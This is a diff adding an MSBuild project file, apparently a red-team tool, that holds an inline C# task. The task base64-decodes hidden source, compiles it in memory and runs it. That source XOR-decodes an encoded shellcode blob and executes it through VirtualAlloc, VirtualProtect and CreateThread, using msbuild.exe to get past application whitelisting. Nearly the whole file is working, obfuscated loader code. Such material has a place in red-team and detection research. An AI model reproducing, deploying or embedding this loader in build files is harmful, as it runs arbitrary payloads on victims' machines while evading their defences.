@@ -1,0 +1,62 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <!-- This inline task executes c# code. -->
+  <!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe nps.xml -->
+  <!-- Original MSBuild Author: Casey Smith, Twitter: @subTee -->
+  <!-- NPS Created By: Ben Ten, Twitter: @ben0xa -->
+  <!-- Created C# payload: Franci Sacer, Twitter: @francisacer1 -->
+  <!-- License: BSD 3-Clause -->
+  <Target Name="npscsharp">
+   <coolkids />
+  </Target>
+  <UsingTask
+    TaskName="coolkids"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+  <Task>
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+        using System;
+        using System.Collections.Generic;
+        using System.Linq;
+        using System.Text;
+        using System.Runtime.InteropServices;
+        using System.Collections.ObjectModel;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+        using Microsoft.CSharp;
+        using System.CodeDom.Compiler;
+        using System.Reflection;
+
+        public class coolkids : Task, ITask
+        {
+            public override bool Execute()
+            {
+                Console.WriteLine("hey there");
+                string cmd = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CnVzaW5nIFN5c3RlbS5UZXh0OwpwdWJsaWMgY2xhc3MgUGxhaW5KYW5lCnsKICAgIHByaXZhdGUgc3RhdGljIFVJbnQzMiBNRU1fQ09NTUlUID0gMHgxMDAwOwogICAgcHJpdmF0ZSBzdGF0aWMgVUludDMyIFBBR0VfUkVBRFdSSVRFID0gMHgwNDsKICAgIHByaXZhdGUgc3RhdGljIFVJbnQzMiBQQUdFX0VYRUNVVEVfUkVBRCA9IDB4MjA7CiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIFVJbnQzMiBWaXJ0dWFsQWxsb2MoVUludDMyIGxwU3RhcnRBZGRyLCBVSW50MzIgc2l6ZSwgVUludDMyIGZsQWxsb2NhdGlvblR5cGUsIFVJbnQzMiBmbFByb3RlY3QpOwogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIFZpcnR1YWxQcm90ZWN0KEludFB0ciBhZGRyZXNzLCBVSW50MzIgc2l6ZSwgVUludDMyIG5ld1Byb3RlY3QsIG91dCBVSW50MzIgb2xkUHJvdGVjdCk7CiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIEludFB0ciBDcmVhdGVUaHJlYWQoCiAgICAgICAgVUludDMyIGxwVGhyZWFkQXR0cmlidXRlcywKICAgICAgICBVSW50MzIgZHdTdGFja1NpemUsCiAgICAgICAgVUludDMyIGxwU3RhcnRBZGRyZXNzLAogICAgICAgIEludFB0ciBwYXJhbSwKICAgICAgICBVSW50MzIgZHdDcmVhdGlvbkZsYWdzLAogICAgICAgIHJlZiBVSW50MzIgbHBUaHJlYWRJZAogICAgKTsKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gVUludDMyIFdhaXRGb3JTaW5nbGVPYmplY3QoSW50UHRyIGhIYW5kbGUsIFVJbnQzMiBkd01pbGxpc2Vjb25kcyk7CiAgICBwdWJsaWMgdm9pZCBFeGVjdXRlKCkgewogICAgICAgIHN0cmluZyByYXcgPSBAImVSNFJBaUoyTEJFeU9sd3VLeVp5QUQ5eUNFUS9ZREVNQ2dZa0JRSkFleTBpY2xRZ0hDa0JIQ1FWQUNrRmRpUWpJajU2RWlJVWVDTmlOUU5nQUdVTUVpWitHUnM3T2tZUEl4MWFBUVVDQVdFRENBd2JLbllsQkFKRFdSdFNQMEFoUHprYWZ4YzFJVGxNQVJjU0VRUUNBQjQvV2d3eUpSQjNNRGNmZGdWa1AyRmVOVnNPTVFaaEtXWnhLSDhTRkEwTk5IVWFFbHRIUVFjUE1uZzZQeFlZV0J3WERDTTZZUUV4UGhVZEpUNTBDUW8vT3dWQlBBZEpMZ0ZhTzJBcU5GcHhCeElGR3dBRUlYNHlLQ0VKVEE0NEtGbENmQll6ZEg0L053YzVaRE13SG01U1lTTUVDaFI4RmpOM1YxSmxFZ2h5WUJZVEF5SjJMQ1l4SzBJd01CSlVHVEk1TGtRT1l4ZHhMSEZVSlE0a0MzWTBkd0VpQXhVbFJBODdLZ29CY1M4QU9CNVJPandzQVFjYktIQkFBVHdpT3pkTk95ay9ORVozTXcxZlhob1dIM29aRnlJSE1XTWpHemdrWUFZRUsyWXBBQVViWnd3Nk5pMHhjRlFXRGg0TGN6TjBkanMwQkQxZ0dCY2NFRG9GRlFBNUhsWWtNblZZRFRWemNFb0FGRDR3TUFVakh5UWtkQlFvTG1wZE5RUWhmemRpRUhVM2NRRTlPVFpDY3pjdVFEMERLRDBGR3hrUU1RRi9CU285SlVJc05CSkFPek1vUFVVMU9nd0tPbUEvSUQ1RFhqYzBIVUFZQjNNaGNBSVZFM0lBYngwaE1TdHdPQUlRU0ZnRUtRZDVHenM2TmpsL0hTWXhRRlkyTVM5VEhBd29JUWNNS3pJNEFsby9NVDBsWGdrekRYMVpOeTBIV3dCakZETXVCbFJrT1RWMEtpZ3BaaElYQlF0Y0FHVVZKeHRCUWdZQ0VHZ1dCd1J4RW1JS0cyY0RZRFlaTmdZM1AxMUNaemNwYWg4OU9pNG1lQTVqRVFBdVFDd1JBaFp3TXlRRGNob2VjaE5jTWdRWkpBdEJRZ1krUW53V00zUnFCQm9TRUdvemZsY1hDMVF2WVMwMFd3c2pNbkVxTndZZFJCZzBQRzVTWWxSaEVSWmFEeWNFY1NvM0tBdGNGeE01QUNKd0NoRXFObk1ETTNkWU1pWUZHVjk1YUM4Vk5nWWlHbDVDVmkwbkJuRXFGd1VIWkRjVE14WUtVaUYvV2lwcUF3SUlHeWNVTkFGM1BqSTZjRlpoQnhReldGb3dTV29mUkJzWElnWWFPekU0TEdSWktTVTNXVGNyRVdVUkZ3OC9SQ0l3TWhZQ1VDOEVSRXBuZnc9PSI7CiAgICAgICAgYnl0ZVtdIHNoZWxsY29kZSA9IENvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhwamxhZGQoIlZReEFjN21Qa3MyQmZFMGtWQ0kzIiwgQmFzZTY0RGVjb2RlKHJhdykpKTsKICAgICAgICBVSW50MzIgZnVuY0FkZHIgPSBWaXJ0dWFsQWxsb2MoMCwgKFVJbnQzMilzaGVsbGNvZGUuTGVuZ3RoLCBNRU1fQ09NTUlULCBQQUdFX1JFQURXUklURSk7CiAgICAgICAgTWFyc2hhbC5Db3B5KHNoZWxsY29kZSwgMCwgKEludFB0cikoZnVuY0FkZHIpLCBzaGVsbGNvZGUuTGVuZ3RoKTsKICAgICAgICBVSW50MzIgb2xkUHJvdGVjdDsKICAgICAgICBWaXJ0dWFsUHJvdGVjdCgoSW50UHRyKShmdW5jQWRkciksIChVSW50MzIpc2hlbGxjb2RlLkxlbmd0aCwgUEFHRV9FWEVDVVRFX1JFQUQsIG91dCBvbGRQcm90ZWN0KTsKICAgICAgICBJbnRQdHIgaFRocmVhZCA9IEludFB0ci5aZXJvOwogICAgICAgIFVJbnQzMiB0aHJlYWRJZCA9IDA7CiAgICAgICAgSW50UHRyIHBpbmZvID0gSW50UHRyLlplcm87CiAgICAgICAgaFRocmVhZCA9IENyZWF0ZVRocmVhZCgwLCAwLCBmdW5jQWRkciwgcGluZm8sIDAsIHJlZiB0aHJlYWRJZCk7CiAgICAgICAgV2FpdEZvclNpbmdsZU9iamVjdChoVGhyZWFkLCAweEZGRkZGRkZGKTsKICAgIH0KCiAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBwamxhZGQoc3RyaW5nIGtleSwgc3RyaW5nIGlucHV0KQogICAgewogICAgICAgIFN0cmluZ0J1aWxkZXIgc2IgPSBuZXcgU3RyaW5nQnVpbGRlcigpOwogICAgICAgIGZvcihpbnQgaT0wOyBpIDwgaW5wdXQuTGVuZ3RoOyBpKyspCiAgICAgICAgICAgIHNiLkFwcGVuZCgoY2hhcikoaW5wdXRbaV0gXiBrZXlbKGkgJSBrZXkuTGVuZ3RoKV0pKTsKICAgICAgICBTdHJpbmcgcmVzdWx0ID0gc2IuVG9TdHJpbmcoKTsKICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEJhc2U2NEVuY29kZShzdHJpbmcgdGV4dCkgewogICAgICAgcmV0dXJuIFN5c3RlbS5Db252ZXJ0LlRvQmFzZTY0U3RyaW5nKFN5c3RlbS5UZXh0LkVuY29kaW5nLlVURjguR2V0Qnl0ZXModGV4dCkpOwogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEJhc2U2NERlY29kZShzdHJpbmcgZW5jb2RlZHRleHQpIHsKCSAgICByZXR1cm4gU3lzdGVtLlRleHQuRW5jb2RpbmcuVVRGOC5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhlbmNvZGVkdGV4dCkpOwogICAgfQp9";
+                CSharpCodeProvider coolkids = new CSharpCodeProvider();
+                CompilerParameters parameters = new CompilerParameters();
+                parameters.ReferencedAssemblies.Add("System.dll");
+                parameters.ReferencedAssemblies.Add("System.Runtime.InteropServices.dll");
+                parameters.GenerateExecutable = false;
+                parameters.GenerateInMemory = true;
+                parameters.IncludeDebugInformation = false;
+                CompilerResults results = coolkids.CompileAssemblyFromSource(parameters, Base64Decode(cmd));
+                Assembly assembly = results.CompiledAssembly;
+                object obj = assembly.CreateInstance("PlainJane");
+                obj.GetType().InvokeMember("Execute", BindingFlags.InvokeMethod, null, obj, null);
+                return true;
+            }
+
+            public static string Base64Encode(string text) {
+               return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(text));
+            }
+
+            public static string Base64Decode(string encodedtext) {
+                return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(encodedtext));
+            }
+        }
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
